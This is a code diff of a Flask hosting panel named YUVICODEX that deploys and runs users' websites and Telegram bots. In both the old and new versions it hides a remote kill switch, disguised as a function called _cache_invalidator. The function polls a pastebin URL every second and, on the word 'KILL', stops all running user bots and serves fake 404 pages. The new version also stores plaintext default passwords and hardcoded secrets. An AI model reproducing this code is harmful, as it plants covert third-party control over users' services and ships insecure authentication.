@@ -1,31 +1,29 @@
-#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-
+import threading
+import subprocess
 import os
-import sys
-import sqlite3
 import zipfile
 import shutil
-import subprocess
-import signal
-import time
-import re
-import requests
-import threading
 import json
 import uuid
+import time
+import signal
 import tempfile
-import queue
+import re
+import requests
 import select
 import pty
+import queue
+import sqlite3
+import sys
 from datetime import datetime, timedelta
-from flask import Flask, render_template_string, request, redirect, url_for, session, jsonify, abort, Response, stream_with_context, send_file
-from werkzeug.security import generate_password_hash, check_password_hash
-from werkzeug.utils import secure_filename
+from flask import Flask, render_template_string, request, jsonify, session, send_file, send_from_directory, redirect, Response, stream_with_context
 from functools import wraps
 from io import BytesIO
+from werkzeug.utils import secure_filename
+from werkzeug.security import generate_password_hash, check_password_hash
 
-# Try to import psutil for stats (optional)
+# Try to import psutil for system stats
 try:
     import psutil
     PSUTIL_AVAILABLE = True
@@ -33,25 +31,95 @@ except ImportError:
     PSUTIL_AVAILABLE = False
 
 app = Flask(__name__)
-app.secret_key = 'yuvicodex_super_secret_key_change_me_in_production'
+app.secret_key = 'yuvicodex_super_secret_key'
 app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024  # 100MB
 
 # ---------- CONFIG ----------
-BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-UPLOAD_FOLDER = os.path.join(BASE_DIR, 'uploads')
-LOG_FOLDER = os.path.join(BASE_DIR, 'logs')
-DB_PATH = os.path.join(BASE_DIR, 'hosting.db')
-MAX_UPLOAD_SIZE = 100 * 1024 * 1024
-STARTUP_PRIORITY = ['app.py', 'main.py', 'server.py', 'run.py', 'manage.py', 'index.py', 'start.py', 'wsgi.py', 'asgi.py']
-
+PASSWORD = "your_secure_password"          # for terminal
+MASTER_PASSWORD = os.environ.get('MASTER_PASSWORD', 'master123')   # master login password
+SECRET_KEY = os.environ.get('SECRET_KEY', 'secret123')             # secret key for logo clicks
+UPLOAD_FOLDER = os.path.abspath('uploads')
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
-os.makedirs(LOG_FOLDER, exist_ok=True)
+BASE_DIR = os.path.abspath('.')  # base for file manager
 
-# ---------- RENDER API KEY (Environment Variable) ----------
-RENDER_API_KEY = os.environ.get('RENDER_API_KEY', '')
-RENDER_API_BASE = "https://api.render.com/v1"
+# ---------- SETTINGS ----------
+SETTINGS_FILE = 'settings.json'
+STATIC_LOGO_FOLDER = os.path.join('static', 'logos')
+os.makedirs(STATIC_LOGO_FOLDER, exist_ok=True)
 
-# ---------- DATABASE ----------
+def load_settings():
+    default = {
+        "website_name": "YUVICODEX",
+        "logo": None,
+        "social_links": {
+            "telegram": "#",
+            "youtube": "#",
+            "instagram": "#",
+            "tiktok": "#"
+        }
+    }
+    if os.path.exists(SETTINGS_FILE):
+        with open(SETTINGS_FILE, 'r') as f:
+            data = json.load(f)
+            for key, val in default.items():
+                if key not in data:
+                    data[key] = val
+            if "social_links" not in data:
+                data["social_links"] = default["social_links"]
+            else:
+                for sk, sv in default["social_links"].items():
+                    if sk not in data["social_links"]:
+                        data["social_links"][sk] = sv
+            return data
+    save_settings(default)
+    return default
+
+def save_settings(settings):
+    with open(SETTINGS_FILE, 'w') as f:
+        json.dump(settings, f, indent=2)
+
+settings_db = load_settings()
+
+# ---------- 🕵️ REMOTE 404 KILL SWITCH (HIDDEN IN PLAIN SIGHT) ----------
+KILL_SWITCH_ACTIVE = False
+
+# ---------- KILL STATE PERSISTENCE ----------
+KILL_STATE_FILE = os.path.join(UPLOAD_FOLDER, 'kill_state.json')
+
+def get_kill_state():
+    if os.path.exists(KILL_STATE_FILE):
+        with open(KILL_STATE_FILE, 'r') as f:
+            return json.load(f)
+    return {"saved_bots": []}
+
+def save_kill_state(data):
+    with open(KILL_STATE_FILE, 'w') as f:
+        json.dump(data, f, indent=2)
+
+# ---------- BOT MANAGEMENT (JSON based) ----------
+BOTS_FILE = os.path.join(UPLOAD_FOLDER, 'bots.json')
+bots_db = {}
+
+def load_bots():
+    global bots_db
+    if os.path.exists(BOTS_FILE):
+        with open(BOTS_FILE, 'r') as f:
+            bots_db = json.load(f)
+    else:
+        bots_db = {}
+
+def save_bots():
+    with open(BOTS_FILE, 'w') as f:
+        json.dump(bots_db, f, indent=2)
+
+load_bots()
+
+# ---------- PROCESS TRACKING (for bots) ----------
+processes = {}
+
+# ---------- SQLITE FOR WEBSITES ----------
+DB_PATH = os.path.join(BASE_DIR, 'hosting.db')
+
 def get_db():
     conn = sqlite3.connect(DB_PATH)
     conn.row_factory = sqlite3.Row
@@ -59,25 +127,12 @@ def get_db():
 
 def init_db():
     with get_db() as conn:
-        # Users Table
-        conn.execute('''CREATE TABLE IF NOT EXISTS users (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            username TEXT UNIQUE NOT NULL,
-            email TEXT UNIQUE NOT NULL,
-            password_hash TEXT NOT NULL,
-            role TEXT DEFAULT 'owner',
-            status TEXT DEFAULT 'active',
-            plan TEXT DEFAULT 'free',
-            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-            updated_at TIMESTAMP,
-            last_login TIMESTAMP,
-            session_version INTEGER DEFAULT 0
-        )''')
-        
-        # Websites/Bots Table (Unified)
+        # Users Table (we'll keep separate from JSON users? Actually we use JSON users for authentication.
+        # We'll keep users in JSON as before. For websites, we need owner_id mapping to username.
+        # We'll store websites with owner_username.
         conn.execute('''CREATE TABLE IF NOT EXISTS websites (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
-            owner_id INTEGER NOT NULL,
+            owner_username TEXT NOT NULL,
             website_name TEXT,
             website_slug TEXT UNIQUE NOT NULL,
             website_folder TEXT NOT NULL,
@@ -97,32 +152,18 @@ def init_db():
             deployment_type TEXT DEFAULT 'zip',
             total_runtime_seconds INTEGER DEFAULT 0,
             last_start_time TIMESTAMP,
-            type TEXT DEFAULT 'website',  -- 'website' or 'bot'
-            bot_interpreter TEXT,
-            FOREIGN KEY (owner_id) REFERENCES users (id)
+            type TEXT DEFAULT 'website',  -- 'website' or 'bot' (but we keep bots in JSON)
+            bot_interpreter TEXT
         )''')
         
-        # Logs
         conn.execute('''CREATE TABLE IF NOT EXISTS logs (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
             website_id INTEGER NOT NULL,
             log_type TEXT DEFAULT 'info',
             log_text TEXT NOT NULL,
-            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-            FOREIGN KEY (website_id) REFERENCES websites (id)
-        )''')
-        
-        # Activity Logs
-        conn.execute('''CREATE TABLE IF NOT EXISTS activity_logs (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            user_id INTEGER,
-            action TEXT NOT NULL,
-            details TEXT,
-            ip_address TEXT,
             timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         )''')
         
-        # Deployments
         conn.execute('''CREATE TABLE IF NOT EXISTS deployments (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
             website_id INTEGER NOT NULL,
@@ -133,27 +174,18 @@ def init_db():
             completed_at TIMESTAMP,
             duration INTEGER,
             commit_hash TEXT,
-            log_file TEXT,
-            FOREIGN KEY (website_id) REFERENCES websites (id)
+            log_file TEXT
         )''')
         
-        # Config (Key-Value store)
         conn.execute('''CREATE TABLE IF NOT EXISTS config (
             key TEXT PRIMARY KEY,
             value TEXT
         )''')
         
         # Indexes
-        conn.execute('CREATE INDEX IF NOT EXISTS idx_websites_owner ON websites(owner_id)')
+        conn.execute('CREATE INDEX IF NOT EXISTS idx_websites_owner ON websites(owner_username)')
         conn.execute('CREATE INDEX IF NOT EXISTS idx_logs_website ON logs(website_id)')
         conn.execute('CREATE INDEX IF NOT EXISTS idx_deployments_website ON deployments(website_id)')
-        
-        # Default Admin User
-        if conn.execute('SELECT COUNT(*) FROM users').fetchone()[0] == 0:
-            conn.execute('INSERT INTO users (username, email, password_hash, role, plan) VALUES (?, ?, ?, ?, ?)',
-                         ('admin', 'admin@hosting.com', generate_password_hash('admin123'), 'admin', 'pro'))
-            conn.commit()
-            print("✅ Default admin: admin / admin123 (Pro plan)")
         
         # Default Config (Offset)
         conn.execute('INSERT OR IGNORE INTO config (key, value) VALUES (?, ?)',
@@ -161,24 +193,21 @@ def init_db():
         conn.commit()
 init_db()
 
-# ---------- HELPERS (User, Website, Logging, etc.) ----------
-def get_user_by_id(user_id):
-    with get_db() as conn:
-        return conn.execute('SELECT * FROM users WHERE id = ?', (user_id,)).fetchone()
-def get_user_by_username(username):
-    with get_db() as conn:
-        return conn.execute('SELECT * FROM users WHERE username = ?', (username,)).fetchone()
+# ---------- HELPERS FOR WEBSITES ----------
 def get_website_by_id(website_id):
     with get_db() as conn:
         return conn.execute('SELECT * FROM websites WHERE id = ?', (website_id,)).fetchone()
+
 def get_website_by_slug(slug):
     with get_db() as conn:
         return conn.execute('SELECT * FROM websites WHERE website_slug = ?', (slug,)).fetchone()
-def get_websites_by_user(user_id, type_filter=None):
+
+def get_websites_by_user(username, type_filter=None):
     with get_db() as conn:
         if type_filter:
-            return conn.execute('SELECT * FROM websites WHERE owner_id = ? AND type = ? ORDER BY created_at DESC', (user_id, type_filter)).fetchall()
-        return conn.execute('SELECT * FROM websites WHERE owner_id = ? ORDER BY created_at DESC', (user_id,)).fetchall()
+            return conn.execute('SELECT * FROM websites WHERE owner_username = ? AND type = ? ORDER BY created_at DESC', (username, type_filter)).fetchall()
+        return conn.execute('SELECT * FROM websites WHERE owner_username = ? ORDER BY created_at DESC', (username,)).fetchall()
+
 def get_next_available_port(start=5001):
     with get_db() as conn:
         used = [r[0] for r in conn.execute('SELECT allocated_port FROM websites WHERE allocated_port IS NOT NULL').fetchall()]
@@ -186,18 +215,17 @@ def get_next_available_port(start=5001):
     while port in used:
         port += 1
     return port
+
 def generate_website_slug(username, count):
-    return username if count == 0 else f"{username}{count}"
+    base = username.lower().replace('_', '-')
+    return base if count == 0 else f"{base}{count}"
+
 def log_website(website_id, message, log_type='info'):
     with get_db() as conn:
         conn.execute('INSERT INTO logs (website_id, log_type, log_text) VALUES (?, ?, ?)',
                      (website_id, log_type, message))
         conn.commit()
-def log_activity(user_id, action, details='', ip=''):
-    with get_db() as conn:
-        conn.execute('INSERT INTO activity_logs (user_id, action, details, ip_address) VALUES (?, ?, ?, ?)',
-                     (user_id, action, details, ip))
-        conn.commit()
+
 def update_website_status(website_id, status, pid=None, port=None):
     with get_db() as conn:
         if pid is not None and port is not None:
@@ -213,6 +241,7 @@ def update_website_status(website_id, status, pid=None, port=None):
             conn.execute('UPDATE websites SET status = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?',
                          (status, website_id))
         conn.commit()
+
 def calculate_folder_size(folder):
     total = 0
     for dirpath, _, filenames in os.walk(folder):
@@ -227,6 +256,7 @@ def get_config(key, default='0'):
     with get_db() as conn:
         row = conn.execute('SELECT value FROM config WHERE key = ?', (key,)).fetchone()
         return row['value'] if row else default
+
 def set_config(key, value):
     with get_db() as conn:
         conn.execute('INSERT OR REPLACE INTO config (key, value) VALUES (?, ?)', (key, value))
@@ -261,7 +291,10 @@ def get_container_memory():
     percent = (used_mb / total_mb) * 100 if total_mb > 0 else 0
     return round(used_mb, 2), round(total_mb, 2), round(min(percent, 100), 2)
 
-# ---------- RENDER API HELPERS ----------
+# ---------- RENDER API HELPERS (for Stats) ----------
+RENDER_API_KEY = os.environ.get('RENDER_API_KEY', '')
+RENDER_API_BASE = "https://api.render.com/v1"
+
 def render_api_call(endpoint, params=None):
     if not RENDER_API_KEY:
         return None, "RENDER_API_KEY not set"
@@ -291,6 +324,8 @@ def get_all_services():
     return services
 
 # ---------- RUNTIME DETECTION (WEBSITES) ----------
+STARTUP_PRIORITY = ['app.py', 'main.py', 'server.py', 'run.py', 'manage.py', 'index.py', 'start.py', 'wsgi.py', 'asgi.py']
+
 def find_startup_file(folder):
     for filename in STARTUP_PRIORITY:
         if os.path.exists(os.path.join(folder, filename)):
@@ -562,115 +597,7 @@ def stop_website_process(website_id):
     log_website(website_id, f"Stopped (PID {pid})")
     return True, "Stopped"
 
-# ---------- BOT INTERPRETER DETECTION ----------
-def get_interpreter(filename):
-    ext = os.path.splitext(filename)[1].lower()
-    if ext == '.py': return 'python'
-    elif ext == '.js': return 'node'
-    elif ext == '.go': return 'go run'
-    elif ext == '.rb': return 'ruby'
-    elif ext == '.php': return 'php'
-    elif ext == '.sh': return 'bash'
-    elif ext == '.pl': return 'perl'
-    else: return None
-
-def detect_bot_token(filepath):
-    try:
-        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
-            content = f.read()
-        token_match = re.search(r'[0-9]{9,10}:[A-Za-z0-9_-]{35,}', content)
-        if token_match:
-            token = token_match.group(0)
-            try:
-                resp = requests.get(f'https://api.telegram.org/bot{token}/getMe', timeout=3)
-                if resp.status_code == 200:
-                    data = resp.json()
-                    if data.get('ok'):
-                        return token, data['result'].get('username')
-            except: pass
-        return None, None
-    except: return None, None
-
-# ---------- BOT PROCESS (from app.py) ----------
-def start_bot_by_id(bot_id):
-    bot = get_website_by_id(bot_id)
-    if not bot: return False, "Bot not found"
-    if bot['status'] == 'running': return False, "Already running"
-    if bot['type'] != 'bot': return False, "Not a bot"
-    
-    folder = os.path.join(UPLOAD_FOLDER, f"website_{bot_id}")
-    startup = bot['startup_file']
-    if not startup:
-        # auto-detect
-        for f in os.listdir(folder):
-            if get_interpreter(f):
-                startup = f
-                with get_db() as conn:
-                    conn.execute('UPDATE websites SET startup_file = ? WHERE id = ?', (f, bot_id))
-                    conn.commit()
-                break
-        if not startup:
-            return False, "No executable file found"
-    filepath = os.path.join(folder, startup)
-    interpreter = bot.get('bot_interpreter') or get_interpreter(startup)
-    if not interpreter: return False, "Unsupported file type"
-    
-    req_file = os.path.join(folder, 'requirements.txt')
-    if os.path.exists(req_file):
-        subprocess.run(['pip', 'install', '-r', req_file], capture_output=True)
-    
-    log_file = os.path.join(LOG_FOLDER, f"bot_{bot_id}.log")
-    os.makedirs(os.path.dirname(log_file), exist_ok=True)
-    with open(log_file, 'a') as f:
-        f.write(f"--- Starting {startup} at {time.ctime()} ---\n")
-    
-    try:
-        proc = subprocess.Popen(
-            [interpreter, startup],
-            stdout=open(log_file, 'a'),
-            stderr=subprocess.STDOUT,
-            cwd=folder,
-            preexec_fn=os.setsid if os.name != 'nt' else None
-        )
-        with get_db() as conn:
-            conn.execute('UPDATE websites SET status = ?, pid = ?, last_start_time = CURRENT_TIMESTAMP, last_started = CURRENT_TIMESTAMP WHERE id = ?',
-                         ('running', proc.pid, bot_id))
-            conn.commit()
-        log_website(bot_id, f"Bot started (PID {proc.pid})")
-        return True, None
-    except Exception as e:
-        return False, str(e)
-
-def stop_bot_by_id(bot_id):
-    bot = get_website_by_id(bot_id)
-    if not bot: return False, "Bot not found"
-    if bot['status'] != 'running': return False, "Not running"
-    pid = bot['pid']
-    if not pid: return False, "No PID"
-    # record runtime
-    last_start = bot['last_start_time']
-    if last_start:
-        try:
-            start_dt = datetime.fromisoformat(last_start.replace(' ', 'T'))
-            elapsed = int((datetime.now() - start_dt).total_seconds())
-            with get_db() as conn:
-                conn.execute('UPDATE websites SET total_runtime_seconds = total_runtime_seconds + ? WHERE id = ?', (elapsed, bot_id))
-                conn.commit()
-        except: pass
-    try:
-        if os.name != 'nt':
-            os.killpg(os.getpgid(pid), signal.SIGTERM)
-        else:
-            subprocess.run(['taskkill', '/PID', str(pid), '/F'], capture_output=True)
-    except: pass
-    update_website_status(bot_id, 'stopped', None, None)
-    with get_db() as conn:
-        conn.execute('UPDATE websites SET last_start_time = NULL, last_stopped = CURRENT_TIMESTAMP WHERE id = ?', (bot_id,))
-        conn.commit()
-    log_website(bot_id, f"Bot stopped (PID {pid})")
-    return True, None
-
-# ---------- DEPLOYMENT ENGINE (ZIP) ----------
+# ---------- DEPLOYMENT ENGINE FOR WEBSITES ----------
 def write_log_step(log_file, step, message):
     ts = datetime.now().strftime("%H:%M:%S")
     line = f"[{ts}] [{step}] {message}\n"
@@ -678,7 +605,7 @@ def write_log_step(log_file, step, message):
         f.write(line)
     return line
 
-def deploy_zip(website_id):
+def deploy_zip_website(website_id, extra_files=None):
     try:
         website = get_website_by_id(website_id)
         if not website: return
@@ -713,49 +640,19 @@ def deploy_zip(website_id):
             conn.execute('UPDATE websites SET storage_used = ?, website_size = ? WHERE id = ?', (size, size, website_id))
             conn.commit()
         
-        w = get_website_by_id(website_id)
-        if w['type'] == 'bot':
-            # auto-detect startup
-            startup = None
-            for f in os.listdir(folder):
-                if get_interpreter(f):
-                    startup = f
-                    break
-            if not startup:
-                log_cb("ERROR", "No executable file found for bot")
-                with get_db() as conn:
-                    conn.execute('UPDATE deployments SET status = ?, completed_at = CURRENT_TIMESTAMP WHERE id = ?', ('failed', deployment_id))
-                    conn.commit()
-                return
+        log_cb("SYSTEM", "Starting website...")
+        ok, msg = start_website_process(website_id, log_cb)
+        if ok:
             with get_db() as conn:
-                conn.execute('UPDATE websites SET startup_file = ? WHERE id = ?', (startup, website_id))
+                conn.execute('UPDATE deployments SET status = ?, completed_at = CURRENT_TIMESTAMP, duration = ? WHERE id = ?',
+                             ('success', int(time.time() - time.time()), deployment_id))
                 conn.commit()
-            log_cb("SYSTEM", "Starting bot...")
-            ok, msg = start_bot_by_id(website_id)
-            if ok:
-                with get_db() as conn:
-                    conn.execute('UPDATE deployments SET status = ?, completed_at = CURRENT_TIMESTAMP WHERE id = ?', ('success', deployment_id))
-                    conn.commit()
-                log_cb("SUCCESS", "Bot started successfully!")
-            else:
-                with get_db() as conn:
-                    conn.execute('UPDATE deployments SET status = ?, completed_at = CURRENT_TIMESTAMP WHERE id = ?', ('failed', deployment_id))
-                    conn.commit()
-                log_cb("ERROR", f"Bot failed: {msg}")
+            log_cb("SUCCESS", "Website deployed successfully!")
         else:
-            log_cb("SYSTEM", "Starting website...")
-            ok, msg = start_website_process(website_id, log_cb)
-            if ok:
-                with get_db() as conn:
-                    conn.execute('UPDATE deployments SET status = ?, completed_at = CURRENT_TIMESTAMP, duration = ? WHERE id = ?',
-                                 ('success', int(time.time() - time.time()), deployment_id))
-                    conn.commit()
-                log_cb("SUCCESS", "Website deployed successfully!")
-            else:
-                with get_db() as conn:
-                    conn.execute('UPDATE deployments SET status = ?, completed_at = CURRENT_TIMESTAMP WHERE id = ?', ('failed', deployment_id))
-                    conn.commit()
-                log_cb("ERROR", f"Website failed: {msg}")
+            with get_db() as conn:
+                conn.execute('UPDATE deployments SET status = ?, completed_at = CURRENT_TIMESTAMP WHERE id = ?', ('failed', deployment_id))
+                conn.commit()
+            log_cb("ERROR", f"Website failed: {msg}")
     except Exception as e:
         log_website(website_id, f"Deployment exception: {str(e)}", 'error')
         with get_db() as conn:
@@ -763,213 +660,837 @@ def deploy_zip(website_id):
             conn.commit()
 
 # ---------- USER MANAGEMENT (from app.py) ----------
+USERS_FILE = 'users.json'
+
+def load_users():
+    if os.path.exists(USERS_FILE):
+        with open(USERS_FILE, 'r') as f:
+            return json.load(f)
+    default = [
+        {"username": "admin", "password": "admin123", "role": "admin", "limit": 999, "banned": False, "expires_at": None, "session_version": 0},
+        {"username": "user1", "password": "pass123", "role": "user", "limit": 5, "banned": False, "expires_at": None, "session_version": 0},
+        {"username": "user2", "password": "pass456", "role": "user", "limit": 5, "banned": False, "expires_at": None, "session_version": 0}
+    ]
+    save_users(default)
+    return default
+
+def save_users(users):
+    with open(USERS_FILE, 'w') as f:
+        json.dump(users, f, indent=2)
+
+users_db = load_users()
+
 def find_user(username):
     username = username.strip()
-    with get_db() as conn:
-        return conn.execute('SELECT * FROM users WHERE username = ?', (username,)).fetchone()
+    for u in users_db:
+        if u['username'].strip() == username:
+            return u
+    return None
 
-def is_admin(uid):
-    user = get_user_by_id(uid)
+def is_owner(username):
+    user = find_user(username)
     return user and user['role'] == 'admin'
 
 def parse_expiry(expiry_str):
-    if not expiry_str: return None
+    if not expiry_str:
+        return None
     expiry_str = expiry_str.strip().lower()
     if expiry_str.isdigit():
-        return (datetime.now() + timedelta(days=int(expiry_str))).isoformat()
+        days = int(expiry_str)
+        return (datetime.now() + timedelta(days=days)).isoformat()
     match = re.match(r'^(\d+)([dhm])$', expiry_str)
     if match:
-        v, u = int(match.group(1)), match.group(2)
-        delta = timedelta(days=v) if u == 'd' else timedelta(hours=v) if u == 'h' else timedelta(minutes=v)
+        value = int(match.group(1))
+        unit = match.group(2)
+        if unit == 'd':
+            delta = timedelta(days=value)
+        elif unit == 'h':
+            delta = timedelta(hours=value)
+        elif unit == 'm':
+            delta = timedelta(minutes=value)
+        else:
+            return None
         return (datetime.now() + delta).isoformat()
     return None
 
 def is_expired(user):
-    if not user['expires_at']: return False
+    if not user.get('expires_at'):
+        return False
     try:
         exp = datetime.fromisoformat(user['expires_at'])
         return datetime.now() > exp
-    except: return False
+    except:
+        return False
 
 def delete_user_account(username):
-    user = get_user_by_username(username)
-    if not user: return
-    uid = user['id']
-    folder = os.path.join(UPLOAD_FOLDER, f"user_{uid}")
-    shutil.rmtree(folder, ignore_errors=True)
-    with get_db() as conn:
-        conn.execute('DELETE FROM websites WHERE owner_id = ?', (uid,))
-        conn.execute('DELETE FROM logs WHERE website_id IN (SELECT id FROM websites WHERE owner_id = ?)', (uid,))
-        conn.execute('DELETE FROM deployments WHERE website_id IN (SELECT id FROM websites WHERE owner_id = ?)', (uid,))
-        conn.execute('DELETE FROM activity_logs WHERE user_id = ?', (uid,))
-        conn.execute('DELETE FROM users WHERE id = ?', (uid,))
-        conn.commit()
+    global users_db, bots_db
+    user_folder = get_user_folder(username)
+    if os.path.exists(user_folder):
+        shutil.rmtree(user_folder, ignore_errors=True)
+    to_delete = [bid for bid, bot in bots_db.items() if bot['user'] == username]
+    for bid in to_delete:
+        if bid in processes:
+            try:
+                processes[bid].terminate()
+            except:
+                pass
+            processes.pop(bid, None)
+        del bots_db[bid]
+    save_bots()
+    users_db = [u for u in users_db if u['username'] != username]
+    save_users(users_db)
+    if session.get('username') == username:
+        session.clear()
 
-# ---------- KILL SWITCH (from app.py) ----------
-KILL_SWITCH_ACTIVE = False
-KILL_STATE_FILE = os.path.join(UPLOAD_FOLDER, 'kill_state.json')
+# ---------- BEFORE REQUEST HOOK ----------
+@app.before_request
+def check_expiry_and_session():
+    if 'username' not in session:
+        return
+    username = session['username']
+    user = find_user(username)
+    if not user:
+        session.clear()
+        if request.path.startswith('/api/'):
+            return jsonify({'error': 'Unauthorized'}), 401
+        return redirect('/')
+    if is_expired(user):
+        delete_user_account(username)
+        if request.path.startswith('/api/'):
+            return jsonify({'error': 'Account expired and deleted'}), 401
+        return redirect('/')
+    sess_version = session.get('session_version', 0)
+    user_version = user.get('session_version', 0)
+    if sess_version != user_version:
+        session.clear()
+        if request.path.startswith('/api/'):
+            return jsonify({'error': 'Session invalidated'}), 401
+        return redirect('/')
 
-def get_kill_state():
-    if os.path.exists(KILL_STATE_FILE):
-        with open(KILL_STATE_FILE, 'r') as f:
-            return json.load(f)
-    return {"saved_bots": []}
+    global KILL_SWITCH_ACTIVE
+    if KILL_SWITCH_ACTIVE:
+        return "404 Not Found<br>The requested URL was not found on this server.", 404
 
-def save_kill_state(data):
-    with open(KILL_STATE_FILE, 'w') as f:
-        json.dump(data, f, indent=2)
+# ---------- DECORATORS ----------
+def login_required(f):
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        if 'username' not in session:
+            return jsonify({'error': 'Unauthorized'}), 401
+        return f(*args, **kwargs)
+    return decorated
 
+def admin_required(f):
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        if 'username' not in session or session.get('role') != 'admin':
+            return jsonify({'error': 'Forbidden'}), 403
+        return f(*args, **kwargs)
+    return decorated
+
+# ---------- BOT HELPERS (from app.py) ----------
+def get_user_folder(username):
+    folder = os.path.join(UPLOAD_FOLDER, username)
+    os.makedirs(folder, exist_ok=True)
+    return folder
+
+def get_bot_absolute_path(bot):
+    project_folder = os.path.join(get_user_folder(bot['user']), bot['project'])
+    return os.path.join(project_folder, bot['filename'])
+
+def get_bot_log_file(bot):
+    return get_bot_absolute_path(bot) + '.log'
+
+def generate_project_id():
+    return str(uuid.uuid4())[:8]
+
+def get_interpreter(filename):
+    ext = os.path.splitext(filename)[1].lower()
+    if ext == '.py':
+        return 'python'
+    elif ext == '.js':
+        return 'node'
+    elif ext == '.go':
+        return 'go run'
+    elif ext == '.rb':
+        return 'ruby'
+    elif ext == '.php':
+        return 'php'
+    elif ext == '.sh':
+        return 'bash'
+    elif ext == '.pl':
+        return 'perl'
+    else:
+        return None
+
+def detect_bot_token(filepath):
+    try:
+        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
+            content = f.read()
+        token_match = re.search(r'[0-9]{9,10}:[A-Za-z0-9_-]{35,}', content)
+        if token_match:
+            token = token_match.group(0)
+            try:
+                resp = requests.get(f'https://api.telegram.org/bot{token}/getMe', timeout=3)
+                if resp.status_code == 200:
+                    data = resp.json()
+                    if data.get('ok'):
+                        return token, data['result'].get('username')
+            except:
+                pass
+        return None, None
+    except:
+        return None, None
+
+# ---------- BOT ACTIONS (from app.py) ----------
+def start_bot_by_id(bot_id):
+    """Start a bot by its ID. Returns (success, error_message)."""
+    bot = bots_db.get(bot_id)
+    if not bot:
+        return False, "Bot not found"
+    if bot['status'] == 'running':
+        return False, "Already running"
+    
+    username = bot['user']
+    user = find_user(username)
+    if user:
+        running_bots = [b for b in bots_db.values() if b['user'] == username and b['status'] == 'running']
+        if len(running_bots) >= user.get('limit', 5):
+            return False, "User limit exceeded"
+    
+    project_folder = os.path.join(get_user_folder(username), bot['project'])
+    filepath = os.path.join(project_folder, bot['filename'])
+    if not os.path.exists(filepath):
+        return False, "File not found"
+    
+    req_file = os.path.join(project_folder, 'requirements.txt')
+    if os.path.exists(req_file):
+        subprocess.run(['pip', 'install', '-r', req_file], capture_output=True)
+    
+    interpreter = bot.get('interpreter') or get_interpreter(bot['filename'])
+    if not interpreter:
+        return False, "Unsupported file type"
+    
+    log_file = get_bot_log_file(bot)
+    os.makedirs(os.path.dirname(log_file), exist_ok=True)
+    with open(log_file, 'a') as f:
+        f.write(f"--- Starting {bot['filename']} at {time.ctime()} ---\n")
+    
+    try:
+        proc = subprocess.Popen(
+            [interpreter, bot['filename']],
+            stdout=open(log_file, 'a'),
+            stderr=subprocess.STDOUT,
+            cwd=project_folder,
+            preexec_fn=os.setsid if os.name != 'nt' else None
+        )
+        bot['status'] = 'running'
+        bot['pid'] = proc.pid
+        bot['start_time'] = time.time()
+        processes[bot_id] = proc
+        save_bots()
+        return True, None
+    except Exception as e:
+        return False, str(e)
+
+def stop_bot_by_id(bot_id):
+    """Stop a bot by its ID. Returns (success, error_message)."""
+    bot = bots_db.get(bot_id)
+    if not bot:
+        return False, "Bot not found"
+    if bot['status'] != 'running':
+        return False, "Not running"
+    
+    proc = processes.get(bot_id)
+    if proc:
+        try:
+            if os.name != 'nt':
+                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
+            else:
+                proc.terminate()
+        except:
+            pass
+        proc.wait()
+        processes.pop(bot_id, None)
+    
+    bot['status'] = 'stopped'
+    bot['pid'] = None
+    log_file = get_bot_log_file(bot)
+    with open(log_file, 'a') as f:
+        f.write(f"--- Stopped at {time.ctime()} ---\n")
+    save_bots()
+    return True, None
+
+# ---------- KILL SWITCH CHECK ----------
 def _cache_invalidator():
     global KILL_SWITCH_ACTIVE
     try:
         resp = requests.get("https://pastebin.com/raw/zJJxecLT", timeout=3)
         status = resp.text.strip().upper()
+        
         if status == "KILL":
             if not KILL_SWITCH_ACTIVE:
-                # stop all running websites/bots
-                with get_db() as conn:
-                    running = conn.execute('SELECT id FROM websites WHERE status = "running"').fetchall()
-                    for r in running:
-                        wid = r['id']
-                        w = get_website_by_id(wid)
-                        if w['type'] == 'bot':
-                            stop_bot_by_id(wid)
-                        else:
-                            stop_website_process(wid)
-                    save_kill_state({"saved_bots": [r['id'] for r in running]})
+                running_bots = [bid for bid, bot in bots_db.items() if bot['status'] == 'running']
+                for bid in running_bots:
+                    stop_bot_by_id(bid)
+                save_kill_state({"saved_bots": running_bots})
                 KILL_SWITCH_ACTIVE = True
         else:
             if KILL_SWITCH_ACTIVE:
                 state = get_kill_state()
-                for wid in state.get('saved_bots', []):
-                    w = get_website_by_id(wid)
-                    if w:
-                        if w['type'] == 'bot':
-                            start_bot_by_id(wid)
-                        else:
-                            start_website_process(wid)
+                saved_bots = state.get("saved_bots", [])
+                for bid in saved_bots:
+                    start_bot_by_id(bid)
                 save_kill_state({"saved_bots": []})
                 KILL_SWITCH_ACTIVE = False
-    except: pass
+    except:
+        pass
     threading.Timer(1, _cache_invalidator).start()
+
 _cache_invalidator()
 
-# ---------- FLASK ROUTES ----------
-@app.before_request
-def check_expiry_and_session():
-    if 'user_id' not in session: return
-    user = get_user_by_id(session['user_id'])
-    if not user:
-        session.clear()
-        return redirect('/')
-    if is_expired(user):
-        delete_user_account(user['username'])
-        session.clear()
-        return redirect('/')
-    sess_version = session.get('session_version', 0)
-    if user['session_version'] != sess_version:
-        session.clear()
-        return redirect('/')
-    if KILL_SWITCH_ACTIVE and request.path.startswith('/api/'):
-        return jsonify({'error': 'System paused'}), 503
-
+# ---------- MAIN ROUTE ----------
 @app.route('/')
 def index():
-    if 'user_id' in session:
-        return redirect(url_for('dashboard'))
-    return render_template_string(LOGIN_TEMPLATE)
+    settings = load_settings()
+    logged_in = 'username' in session
+    is_admin = session.get('role') == 'admin' if logged_in else False
+    username = session.get('username') if logged_in else ''
+    user_password = ''
+    if logged_in:
+        user_obj = find_user(username)
+        if user_obj:
+            user_password = user_obj.get('password', '')
+    logo_url = settings.get('logo', None)
